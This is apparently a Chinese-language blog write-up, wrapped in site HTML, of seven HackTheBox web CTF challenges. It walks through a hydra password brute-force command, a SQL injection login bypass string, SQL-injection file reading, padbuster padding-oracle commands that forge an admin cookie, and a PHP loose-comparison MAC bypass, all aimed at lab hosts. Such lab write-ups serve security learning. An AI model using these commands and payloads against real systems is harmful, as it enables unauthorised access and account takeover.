@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox-Web-Challenge - Lprvep</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="HackTheBox-Web-Challenge" />
+<meta property="og:description" content="背景  本文仅代表个人观点,如有错误,请多包涵!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.lprvep.com/posts/hackthebox/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-12-05T17:52:38&#43;08:00" />
+<meta property="article:modified_time" content="2019-12-05T17:52:38&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox-Web-Challenge"/>
+<meta name="twitter:description" content="背景  本文仅代表个人观点,如有错误,请多包涵!"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/main.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/dark.css" media="(prefers-color-scheme: dark)" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom-dark.css" media="(prefers-color-scheme: dark)" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="https://www.lprvep.com/js/main.js"></script>
+	<script src="https://www.lprvep.com/js/abc.js"></script>
+	<script src="https://www.lprvep.com/js/xyz.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://www.lprvep.com/">
+	<h1 class="site-title"><a href="https://www.lprvep.com/">Lprvep</a></h1>
+	<div class="site-description"><h2>Web Security</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/godbless7" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/lprvep" title="Twitter"><i data-feather="twitter"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/read">Read</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+			<li>
+				<a href="/avlist">Avlist</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">HackTheBox-Web-Challenge</h1>
+			<div class="meta">Posted at &mdash; Dec 5, 2019</div>
+		</div>
+
+		<div class="markdown">
+			<h3 id="背景">背景</h3>
+<blockquote>
+<p>本文仅代表个人观点,如有错误,请多包涵!</p>
+</blockquote>
+<p>都说hackthebox的ctf有些意思</p>
+<p>就花了点时间来做了下</p>
+<p>这7题总的来说做得还算顺畅</p>
+<p>但是在I know Mag1k这里花的时间比较长</p>
+<p>主要是跑加密的时候,网络总是出问题</p>
+<p>(解密几个小时,加密又几个小时)</p>
+<h3 id="lernaean">Lernaean</h3>
+<blockquote>
+<p>Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!</p>
+</blockquote>
+<p>这直接爆破 没啥好说的</p>
+<p><img src="images/HackTheBox/v39n3nvo3.png" alt="v39n3nvo3"></p>
+<p><img src="images/HackTheBox/77777.png" alt="77777"></p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra 
+-l user   
+<span style="color:#586e75">#指定用户,这里没有需要输入用户,所以输入啥都行</span>
+
+-P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu -s <span style="color:#2aa198">31323</span> -t <span style="color:#2aa198">64</span> 
+<span style="color:#586e75">#-P 字典地址 -s 端口号 url -t 线程</span>
+
+http-post-form <span style="color:#2aa198">&#34;/:password=^PASS^:Invalid password!&#34;</span>
+<span style="color:#586e75">#post请求 目标地址/ : 暴力破解的值给password : 猜测错误的内容</span>
+</code></pre></div><p><img src="images/HackTheBox/cascascas.png" alt="cascascas"></p>
+<h3 id="emdee-five-for-life">Emdee five for life</h3>
+<blockquote>
+<p>Can you encrypt fast enough?</p>
+</blockquote>
+<p><img src="images/HackTheBox/k.png" alt="k"></p>
+<p>这题呢也不和你拐弯抹角了</p>
+<blockquote>
+<p>1.随机给你个字符串</p>
+<p>2.将字符串加密为MD5</p>
+<p>3.提交,如果手快的话就能得到flag</p>
+</blockquote>
+<p>整这些花里花哨的</p>
+<p>不如我写个脚本实在</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#719e07">import</span> requests
+<span style="color:#719e07">import</span> re
+<span style="color:#719e07">import</span> hashlib
+url <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;http://docker.hackthebox.eu:31351/&#34;</span>
+r <span style="color:#719e07">=</span> requests<span style="color:#719e07">.</span>session()
+a<span style="color:#719e07">=</span>r<span style="color:#719e07">.</span>get(url)
+reMD5 <span style="color:#719e07">=</span> re<span style="color:#719e07">.</span>compile(<span style="color:#2aa198">r</span><span style="color:#2aa198">&#34;&lt;h3 align=&#39;center&#39;&gt;([a-zA-Z0-9]+)&lt;/h3&gt;&#34;</span>)
+<span style="color:#b58900">str</span> <span style="color:#719e07">=</span> re<span style="color:#719e07">.</span>findall(reMD5,a<span style="color:#719e07">.</span>text)
+str_md5 <span style="color:#719e07">=</span> hashlib<span style="color:#719e07">.</span>md5(<span style="color:#b58900">str</span>[<span style="color:#2aa198">0</span>]<span style="color:#719e07">.</span>encode(<span style="color:#2aa198">&#39;utf-8&#39;</span>))<span style="color:#719e07">.</span>hexdigest()
+data <span style="color:#719e07">=</span> {<span style="color:#2aa198">&#39;hash&#39;</span>:str_md5}
+a<span style="color:#719e07">=</span>r<span style="color:#719e07">.</span>post(url<span style="color:#719e07">=</span>url,data<span style="color:#719e07">=</span>data)
+<span style="color:#719e07">print</span>(a<span style="color:#719e07">.</span>text)
+</code></pre></div><p><img src="images/HackTheBox/imunyb.png" alt="imunyb"></p>
+<h3 id="fuzzy">Fuzzy</h3>
+<blockquote>
+<p>We have gained access to some infrastructure which we believe is connected to the internal network of our target. We need you to help obtain the administrator password for the website they are currently developing.</p>
+</blockquote>
+<p>根据题目的意思是想要我们fuzz啥?</p>
+<p>那就先扫个目录咯,扫到看起来有用的东西可能就指头下面这个</p>
+<p>/api/了</p>
+<p><img src="images/HackTheBox/959.png" alt="959"></p>
+<p>在api目录下有扫到action.php</p>
+<p>这时感觉题目以及明了了,这里说是没有设置参数</p>
+<p>那我们可能就需要fuzz出参数和id了</p>
+<p><img src="images/HackTheBox/a1sc.png" alt="a1sc"></p>
+<p>然后就拿出wfuzz来fuzz是啥参数</p>
+<p>直接搬出最强大的字典fuzz  冲!</p>
+<p>(这里端口不一样是因为图不是同一天截的)</p>
+<p><img src="images/HackTheBox/asd.png" alt=""></p>
+<p>参数完事,就fuzz后面的id了</p>
+<p><img src="images/HackTheBox/anksn.png" alt=""></p>
+<p>完事</p>
+<p><img src="images/HackTheBox/1111.png" alt="1111"></p>
+<h3 id="cartographer">Cartographer</h3>
+<blockquote>
+<p>Some underground hackers are developing a new command and control server. Can you break in and see what they are up to?</p>
+</blockquote>
+<p><img src="images/HackTheBox/afa.png" alt="afa"></p>
+<p>这题也没啥写的,看到登录框习惯性的万能密码</p>
+<p>' or 1=1 &ndash;+</p>
+<p>然后就进去了</p>
+<p><img src="images/HackTheBox/kdnb.png" alt="kdnb"></p>
+<p>再根据提示 命令? 看到url后面的参数调用</p>
+<p><img src="images/HackTheBox/dgh.png" alt="dgh"></p>
+<p>我就瞬间明白了</p>
+<p><img src="images/HackTheBox/kjhg.png" alt="kjhg"></p>
+<h3 id="freelancer">FreeLancer</h3>
+<blockquote>
+<p>Can you test how secure my website is? Prove me wrong and capture the flag!</p>
+</blockquote>
+<p>在主页中没发现啥,查看源码认真看</p>
+<!-- raw HTML omitted -->
+<p><img src="images/HackTheBox/13.png" alt="13"></p>
+<p>访问下这个地址</p>
+<p>判断了下确定处在sql注入</p>
+<p><img src="images/HackTheBox/65hter.png" alt="65hter"></p>
+<p>但是跑出来的管理员密码和数据库密码都无法解开</p>
+<p><img src="images/HackTheBox/3838.png" alt="3838"></p>
+<p>还是说注入点不是让我们来跑密码的?</p>
+<p>读文件?写文件?</p>
+<p>那就去扫目录看看有什么文件可以读的?</p>
+<p>扫到后台地址:http://docker.hackthebox.eu:31368/administrat/</p>
+<p>但没有发现有什么可以利用,就继续扫这个目录下的东西</p>
+<p><img src="images/HackTheBox/555.png" alt="555"></p>
+<p>扫到了panel.php 但是访问直接跳转到index.php</p>
+<p>所以这是不是我们需要登录后才能访问的文件了</p>
+<p>但是密码无法解密,只能通过sql注入来读取文件了</p>
+<p>一般linux下默认的网站目录均为</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/var/www/html
+所以读取文件应该在
+/var/WWW/html/administrat/panel.php
+</code></pre></div><p><img src="images/HackTheBox/tre.png" alt="tre"></p>
+<p>想要的flag就在这里面</p>
+<p><img src="images/HackTheBox/asdasddsgv.png" alt="asdasddsgv"></p>
+<h3 id="i-know-mag1k">I know Mag1k</h3>
+<blockquote>
+<p>Can you get to the profile page of the admin?</p>
+</blockquote>
+<p>打开以后,就正常的登录框</p>
+<p>根据题目的提示我觉得应该和登录框是没有关系的</p>
+<p><img src="images/HackTheBox/a1s61c.png" alt="a1s61c"></p>
+<p>所以就直接注册登录</p>
+<p><img src="images/HackTheBox/efjwoj.png" alt="efjwoj"></p>
+<p>然后抓包</p>
+<p>在数据包中,就发现cookie中有个iknowmag1k的参数</p>
+<p>刚好就是题目,这里应该就是题目的突破口</p>
+<p><img src="images/HackTheBox/ohohoasch.png" alt="ohohoasch"></p>
+<p>这里也能看出是这串字符串是被加密过了</p>
+<p>现在要做的就是知道它是如何加密的</p>
+<p>经过尝试,知道了这是AES中的CBC的加密</p>
+<p>可通过Padding Oracle 攻击来将这串东西逆转回去</p>
+<p>即平常所说的cbc翻转攻击</p>
+<p>具体的原理可以参考一下链接:</p>
+<p><a href="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html">http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html</a></p>
+<p><a href="https://www.jianshu.com/p/1851f778e579">https://www.jianshu.com/p/1851f778e579</a></p>
+<p>下面就用到了kali里自带的一个工具 padbuster</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">padbuster http://docker.hackthebox.eu:30802/profile.php xKIfvwGXgwzL6LEKv2HRzqb40U9RQHhBCzUZmK3AqPHuAkIbvBrmbA%3D%3D <span style="color:#2aa198">8</span> --cookie <span style="color:#2aa198">&#34;PHPSESSID=icgldatl0apdqv8ieb7islih54;iknowmag1k=xKIfvwGXgwzL6LEKv2HRzqb40U9RQHhBCzUZmK3AqPHuAkIbvBrmbA%3D%3D&#34;</span>
+</code></pre></div><p>上面这串命令中,唯一需要解释的应该只有数字8了</p>
+<p>8是数据块大小的意思</p>
+<p>一般情况下在这有8和16</p>
+<p>具体怎么算的话,查阅资料也没弄明白(等一个懂算的表哥来教教我)</p>
+<p>16在这里用不了,那么就只能8咯</p>
+<p>然后开始漫长的等待,有一说一是真的久</p>
+<p><img src="images/HackTheBox/asdasas.png" alt=""></p>
+<p>半个多小时过去了,终于解了出来</p>
+<p><img src="images/HackTheBox/enivisdnv.png" alt="enivisdnv"></p>
+<p>可以很清楚的看到</p>
+<p>用户:test 角色:user</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">{<span style="color:#2aa198">&#34;user&#34;</span><span style="color:#719e07">:</span><span style="color:#2aa198">&#34;test&#34;</span>,<span style="color:#2aa198">&#34;role&#34;</span><span style="color:#719e07">:</span><span style="color:#2aa198">&#34;user&#34;</span>}
+</code></pre></div><p>这里直接给它安排上admin</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">{<span style="color:#2aa198">&#34;user&#34;</span><span style="color:#719e07">:</span><span style="color:#2aa198">&#34;test&#34;</span>,<span style="color:#2aa198">&#34;role&#34;</span><span style="color:#719e07">:</span><span style="color:#2aa198">&#34;admin&#34;</span>}
+</code></pre></div><p>经过了长时间解密后,又到了长时间的加密时间环节</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">padbuster http://docker.hackthebox.eu:30802/profile.php xKIfvwGXgwzL6LEKv2HRzqb40U9RQHhBCzUZmK3AqPHuAkIbvBrmbA%3D%3D <span style="color:#2aa198">8</span> --cookie <span style="color:#2aa198">&#34;PHPSESSID=icgldatl0apdqv8ieb7islih54;iknowmag1k=xKIfvwGXgwzL6LEKv2HRzqb40U9RQHhBCzUZmK3AqPHuAkIbvBrmbA%3D%3D&#34;</span> -plaintext <span style="color:#2aa198">&#39;{&#34;user&#34;:&#34;test&#34;,&#34;role&#34;:&#34;admin&#34;}&#39;</span>
+</code></pre></div><p>得到的东西替换cookie就可以得到flag</p>
+<h3 id="grammar">Grammar</h3>
+<blockquote>
+<p>When we access this page we get a Forbidden error. However we believe that something strange lies behind&hellip; Can you find a way in and retrieve the flag?</p>
+</blockquote>
+<p>访问一手403</p>
+<p><img src="images/HackTheBox/ad.png" alt="ad"></p>
+<p>但是发现啥也扫不出来,所以应该不是这样来做的</p>
+<p>胡乱搞了一阵</p>
+<p>将get方式修改为post</p>
+<p>访问成功</p>
+<p><img src="images/HackTheBox/asd13.png" alt="asd13"></p>
+<p>在返回的包中cookie中有个ses的参数有点奇怪</p>
+<p>最后的两个%3D代表着==,得到</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IkZhbHNlIiwiTUFDIjoiZmY2ZDBhNTY4ZDYxZTVhMDNiY2RiMDQ1MDlkNTg4NWQifQ==
+</code></pre></div><p>看着就是我们平时见到的base64,解密得到</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">{&#34;User&#34;:&#34;whocares&#34;,&#34;Admin&#34;:&#34;False&#34;,&#34;MAC&#34;:&#34;ff6d0a568d61e5a03bcdb04509d5885d&#34;}
+</code></pre></div><p>将其中的False修改为True 加base64访问</p>
+<p><img src="images/HackTheBox/6161.png" alt="6161"></p>
+<p>回显得到改变,但仍然没有我们想要的flag</p>
+<p>此时应该想的就是MAC这块的问题了</p>
+<p>MAC(消息认证码),用于验证cookie有没有被修改</p>
+<p>如果被修改则终止</p>
+<p>上面我们将False修改成True,所以后面的MAC无法匹配就停止了配对</p>
+<p>但是MAC的验证是使用 != 的 ,且MAC与0或者任意非数字开头的字符串匹配都能为True</p>
+<p>以此类推</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">var_dump(<span style="color:#2aa198">&#39;abcdefg&#39;</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">0</span>); <span style="color:#586e75">// true  0或任意非数字
+</span><span style="color:#586e75"></span>var_dump(<span style="color:#2aa198">&#39;1abcdef&#39;</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">1</span>); <span style="color:#586e75">// true  
+</span><span style="color:#586e75"></span>var_dump(<span style="color:#2aa198">&#39;2abcdef&#39;</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">2</span>); <span style="color:#586e75">// true
+</span><span style="color:#586e75"></span>var_dump(<span style="color:#2aa198">&#39;23abcdef&#39;</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">23</span>); <span style="color:#586e75">// true  只与非数字之前的匹配性
+</span></code></pre></div><p>根据之前的MAC字符串就可以将MAC修改为0</p>
+<p>即可两段检测为True</p>
+<p>进过加密后,重新发包</p>
+<p>可获得flag</p>
+<p><img src="images/HackTheBox/asdasd.png" alt="asdasd"></p>
+
+		</div>
+
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/hackthebox">hackthebox</a></li>
+								
+								<li><a href="/tags/%E9%9D%B6%E6%9C%BA">靶机</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © Copyright notice |  <a href="https://github.com/godbless7">lprvep</a></div>
+	</nav>
+</div>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>feather.replace()</script>
+</body>
+</html>
